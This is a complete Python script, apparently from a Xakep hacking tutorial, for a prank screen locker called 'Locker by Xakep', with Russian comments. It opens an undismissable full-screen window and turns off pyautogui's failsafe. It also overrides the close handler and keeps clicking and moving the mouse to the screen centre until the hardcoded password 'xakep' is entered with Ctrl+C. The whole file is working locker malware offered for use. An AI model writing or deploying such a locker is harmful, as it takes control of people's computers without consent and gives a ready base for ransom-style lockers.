import pyautogui
from tkinter import Tk, Entry, Label
from pyautogui import click, moveTo
from time import sleep


def callback(event):
    global k, entry
    if entry.get() == "xakep":  # задаём ключ
        k = True


def on_closing():
    click(width/2, height/2)  # закликивание в центр экрана
    moveTo(width/2, height/2)  # перемещение курсора в центр экрана
    root.attributes("-fullscreen", True)  # включаем полноэкранный режим
    root.protocol("WM_DELETE_WINDOW", on_closing)  # при попытке закрыть окно с помощью диспетчера окон вызываем функцию
    root.update()  # постоянное обновление окна
    root.bind('<Control-KeyPress-c>', callback)  # вводим сочетание клавиш, которые будут закрывать программу


root = Tk()  # создаём окно
pyautogui.FAILSAFE = False  # выключаем защиту "левого верхнего угла"
width = root.winfo_screenwidth()  # считываем ширину экрана и создаём окно с заданной шириной
height = root.winfo_screenheight()  # считываем высоту экрана и создаём окно с заданной высотой
root.title('From "Xakep" with love')  # пишем как программа отобразиться в панели задач
root.attributes("-fullscreen", True)  # включаем полноэкранный режим
entry = Entry(root, font=1)  # создаём окошко ввода
entry.place(width=150, height=50, x=width/2-75, y=height/2-25)  # размеры окошка и его положение
label0 = Label(root, text="╚(•⌂•)╝ Locker by Xakep (╯°□°）╯︵ ┻━┻", font=1)  # имя открытого окна
label0.grid(row=0, column=0)  # положение надписи с именем
label1 = Label(root, text="Пиши пароль и жми Ctrl+C", font='Arial 20')  # сообщение пользователю
label1.place(x=width/2-75-130, y=height/2-25-100)  # положение сообщения
root.update()  # постоянное обновление окна
sleep(0.2)  # пауза в обновлении
click(width/2, height/2)  # закликивание в центр экрана
k = False  # обнуление ключа
while not k:  # пока не ввели верный ключ
    on_closing()  # вызываем функцию хулиганства
